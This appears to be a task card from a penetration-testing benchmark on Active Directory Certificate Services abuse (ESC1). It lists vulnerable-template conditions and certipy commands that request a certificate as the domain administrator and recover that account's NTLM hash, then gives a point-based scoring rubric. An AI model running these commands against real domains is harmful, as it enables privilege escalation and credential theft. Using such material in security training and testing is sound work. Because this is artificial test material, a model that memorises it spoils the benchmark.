# FOX-AD-003: AD CS Abuse — ESC1

## Info
| Field | Value |
|-------|-------|
| **ID** | FOX-AD-003 |
| **Domain** | Active Directory |
| **MITRE** | T1649 (Steal or Forge Authentication Certificates) |
| **Difficulty** | Hard |
| **Prerequisites** | Domain user credentials, AD CS server found |

## Methodology
1. **Discovery**:
   ```bash
   certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP>
   # Or BloodHound CS CA objects
   ```
2. **Check ESC1 conditions**:
   - Certificate template: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled
   - `Manager CA` approval NOT required
   - Authorized signatures count = 0
   - Low-privilege user has `Enroll` rights
3. **Exploit — Request certificate as DA**:
   ```bash
   certipy req -u <user>@<domain> -p <password> -ca <CA-SERVER> -template <VULNERABLE-TEMPLATE> -upn administrator@<domain>
   certipy req -u <user>@<domain> -p <password> -ca <CA-SERVER> -template <VULNERABLE-TEMPLATE> -dns dc.<domain>
   ```
4. **Authenticate with certificate**:
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
   ```
5. **Result**: NTLM hash of administrator → full domain compromise

## Keywords
`active-directory-certificate-services`, `ADCS`, `ESC1`, `ESC2`, `ESC3`, `certipy`, `certificate template`, `enrollment`, `PKINIT`, `NTLM from cert`

## Scoring Criteria (0-100)
| Criteria | Points |
|----------|--------|
| AD CS server identified | 15 |
| Vulnerable template found (ESC1) | 25 |
| Certificate requested with alternate UPN/DNS | 30 |
| Authentication succeeded via certificate | 20 |
| Domain admin hash obtained | 10 |
| **Total** | **100** |
